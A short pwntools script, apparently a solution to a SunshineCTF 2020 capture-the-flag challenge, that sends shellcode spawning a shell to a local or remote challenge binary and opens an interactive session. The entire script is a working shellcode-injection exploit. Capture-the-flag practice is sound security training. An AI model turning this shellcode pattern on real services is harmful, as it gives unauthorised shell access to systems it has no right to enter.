from pwn import *

binary = context.binary = ELF('./chall_07')

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('chal.2020.sunshinectf.org', 30007)

p.sendline()

payload  = b''
payload += asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
